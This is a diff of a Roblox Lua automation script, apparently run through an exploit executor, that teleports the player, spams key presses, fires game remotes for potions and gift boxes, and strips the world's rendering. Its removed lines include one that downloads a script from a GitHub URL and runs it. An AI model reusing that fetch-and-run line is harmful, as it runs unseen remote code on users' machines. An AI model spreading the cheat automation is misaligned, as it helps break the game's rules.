@@ -1,71 +1,248 @@
 task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/test2"))()
-    end)
-end)
-
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local RemoteModule = require(ReplicatedStorage.Shared.Framework.Network.Remote)
-local RemoteEvent = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
-local LocalDataModule = require(ReplicatedStorage.Client.Framework.Services.LocalData)
-
-local BOX_NAME = "Admin Mystery Box"
-local TARGET_GEMS = 1000000
-local BATCH_SIZE = 50
-
-local potions = {
-    {"Speed", 7},
-    {"Speed", 6},
-    {"Lucky", 7},
-    {"Lucky", 6},
-    {"Egg Elixir", 1},
-    {"Mythic", 7},
-    {"Mythic", 6},
-    {"Infinity Elixir", 1},
-}
-
-local potionIndex = 1
-
-RunService.Heartbeat:Connect(function()
-    local data = LocalDataModule:Get()
-    if not data then return end
-
-    local potion = potions[potionIndex]
-    if potion then
-        RemoteEvent:FireServer("UsePotion", potion[1], potion[2])
-    end
-
-    potionIndex += 1
-    if potionIndex > #potions then
-        potionIndex = 1
-    end
-
-    if data.Gems < TARGET_GEMS then
-        local amount = (data.Powerups and data.Powerups[BOX_NAME]) or 0
-        if amount > 0 then
-            RemoteModule:FireServer("UseGift", BOX_NAME, math.min(BATCH_SIZE, amount))
+    while true do
+        local char = game.Players.LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame = CFrame.new(132.47, 9.73, 97.12)
         end
+        task.wait(60)
     end
 end)
-
-while true do
-    local char = game.Players.LocalPlayer.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    if hrp then
-        hrp.CFrame = CFrame.new(132.47, 9.73, 97.12)
-    end
-    task.wait(60)
-end
 
 pcall(function()
-    require(ReplicatedStorage.Client.Effects.HatchEgg).Play = function() end
+    require(game:GetService("ReplicatedStorage").Client.Effects.HatchEgg).Play = function() end
 end)
 
-local vim = game:GetService("VirtualInputManager")
-while true do
-    vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
-    vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
-    task.wait()
+task.spawn(function()
+    local vim = game:GetService("VirtualInputManager")
+    while true do
+        vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+        vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+        task.wait()
+    end
+end)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+
+local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
+local PetsModule = require(ReplicatedStorage.Shared.Data.Pets)
+
+-- ===== DATA HELPERS =====
+
+local function getLuckTime()
+    local icon = workspace:FindFirstChild("SummonedEgg")
+        and workspace.SummonedEgg:FindFirstChild("Sign")
+        and workspace.SummonedEgg.Sign:FindFirstChild("Display")
+        and workspace.SummonedEgg.Sign.Display:FindFirstChild("SurfaceGui")
+        and workspace.SummonedEgg.Sign.Display.SurfaceGui:FindFirstChild("Icon")
+
+    if not icon then return "x0", "N/A" end
+    local luck = icon:FindFirstChild("Luck")
+    local timer = icon:FindFirstChild("Timer")
+    return luck and luck.Text or "x0", timer and timer.Text or "N/A"
 end
+
+local function getTeamPetIds()
+    local ids = {}
+    local data = LocalData:Get()
+    if not data then return ids end
+
+    local teamIndex = data.TeamEquipped
+    local team = teamIndex and data.Teams and data.Teams[teamIndex]
+    if not team or not team.Pets then return ids end
+
+    for _, id in ipairs(team.Pets) do
+        ids[tostring(id)] = true
+    end
+    return ids
+end
+
+local function countSecrets(data)
+    local inv, team = 0, 0
+    if data and data.Pets then
+        local teamIds = getTeamPetIds()
+        for id, pet in pairs(data.Pets) do
+            local info = PetsModule[pet.Name]
+            if info and info.Rarity == "Secret" then
+                inv += 1
+                if teamIds[tostring(id)] then
+                    team += 1
+                end
+            end
+        end
+    end
+    return inv, team
+end
+
+-- ===== TRACKING (NO UI) =====
+
+local lastEggs = {}
+local eggHistory = {}
+
+task.spawn(function()
+    while true do
+        local data = LocalData:Get()
+        local now = tick()
+
+        if data and data.EggsOpened then
+            for egg, count in pairs(data.EggsOpened) do
+                lastEggs[egg] = count
+            end
+        end
+
+        local h = data and data.Stats and data.Stats.Hatches
+        if h then
+            table.insert(eggHistory, { t = now, v = h })
+            while #eggHistory > 0 and now - eggHistory[1].t > 60 do
+                table.remove(eggHistory, 1)
+            end
+        end
+
+        local luck, timeLeft = getLuckTime()
+        local invSecrets, teamSecrets = countSecrets(data)
+
+        task.wait(0.25)
+    end
+end)
+
+-- ===== WORLD / RENDER STRIPPER =====
+
+task.spawn(function()
+    local RunService = game:GetService("RunService")
+    local Lighting = game:GetService("Lighting")
+    local ws = workspace
+    local lp = Players.LocalPlayer
+    local char = lp.Character or lp.CharacterAdded:Wait()
+
+    local keep = {}
+    local function k(x) if x then keep[x] = true end end
+
+    k(ws.CurrentCamera)
+
+    local rendered = ws:FindFirstChild("Rendered")
+    if rendered then
+        k(rendered)
+        for _, v in ipairs(rendered:GetDescendants()) do k(v) end
+    end
+
+    local egg = ws:FindFirstChild("SummonedEgg")
+    if egg then
+        k(egg)
+        for _, v in ipairs(egg:GetDescendants()) do k(v) end
+    end
+
+    local eggsFolder = ws:FindFirstChild("Eggs")
+    if eggsFolder then
+        k(eggsFolder)
+        for _, v in ipairs(eggsFolder:GetDescendants()) do k(v) end
+    end
+
+    k(char)
+    for _, v in ipairs(char:GetDescendants()) do k(v) end
+
+    lp.CharacterAdded:Connect(function(c)
+        task.wait(0.4)
+        char = c
+        k(c)
+        for _, v in ipairs(c:GetDescendants()) do k(v) end
+    end)
+
+    local function isChar(o)
+        return lp.Character and (o == lp.Character or o:IsDescendantOf(lp.Character))
+    end
+
+    local function safe(o)
+        return not (
+            o:IsA("Script")
+            or o:IsA("LocalScript")
+            or o:IsA("ModuleScript")
+            or o:IsA("RemoteEvent")
+            or o:IsA("RemoteFunction")
+            or o:IsA("ScreenGui")
+        )
+    end
+
+    local function d(i)
+        if i and i.Parent and not keep[i] and not isChar(i) and safe(i) then
+            pcall(function() i:Destroy() end)
+        end
+    end
+
+    local function batch(list, b, w)
+        local i, n = 1, #list
+        while i <= n do
+            for j = i, math.min(i + b - 1, n) do
+                d(list[j])
+            end
+            i += b
+            task.wait(w)
+        end
+    end
+
+    local function collect(pred)
+        local t = {}
+        for _, o in ipairs(ws:GetDescendants()) do
+            if pred(o) then table.insert(t, o) end
+        end
+        return t
+    end
+
+    task.wait(1)
+
+    batch(collect(function(o)
+        return o:IsA("MeshPart")
+            or o:IsA("SpecialMesh")
+            or o:IsA("UnionOperation")
+            or o:IsA("Texture")
+            or o:IsA("Decal")
+            or o:IsA("ParticleEmitter")
+            or o:IsA("Beam")
+            or o:IsA("Trail")
+            or o:IsA("Fire")
+            or o:IsA("Smoke")
+            or o:IsA("Sparkles")
+            or o:IsA("Highlight")
+            or o:IsA("SurfaceAppearance")
+    end), 40, 0.35)
+
+    task.wait(0.8)
+
+    batch(collect(function(o)
+        return o:IsA("Adornment")
+            or o:IsA("SelectionBox")
+            or o:IsA("SelectionSphere")
+            or o:IsA("ArcHandles")
+    end), 20, 0.3)
+
+    task.wait(0.6)
+
+    batch(collect(function(o)
+        return not o:IsA("BasePart") and safe(o)
+    end), 30, 0.5)
+
+    task.wait(1)
+
+    local t2 = {}
+    for _, c in ipairs(ws:GetChildren()) do
+        if not keep[c] and safe(c) then
+            table.insert(t2, c)
+        end
+    end
+    batch(t2, 3, 0.7)
+
+    task.wait(0.6)
+
+    local t3 = {}
+    for _, v in ipairs(Lighting:GetChildren()) do
+        table.insert(t3, v)
+    end
+    batch(t3, 8, 0.4)
+
+    task.wait(0.6)
+
+    pcall(function()
+        RunService:Set3dRenderingEnabled(false)
+    end)
+end)
